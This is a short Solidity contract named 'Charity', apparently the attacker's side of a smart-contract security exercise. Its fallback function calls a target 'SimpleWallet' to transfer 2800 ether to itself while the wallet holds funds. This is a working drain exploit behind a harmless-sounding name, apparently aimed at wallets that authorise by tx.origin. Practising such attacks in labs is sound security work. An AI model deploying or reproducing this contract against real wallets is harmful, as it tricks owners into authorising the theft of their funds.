// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {console} from "forge-std/console.sol";

interface SimpleWallet {
    function transfer(address payable _to, uint _amount) external;
}

contract Charity {

    SimpleWallet simpleWallet;

    constructor(address _simpleWallet) payable {
        simpleWallet = SimpleWallet(_simpleWallet);
    }

    fallback() external payable {
        if (address(simpleWallet).balance > 0) {
            simpleWallet.transfer(payable(address(this)), 2800 ether);
        }
    }

}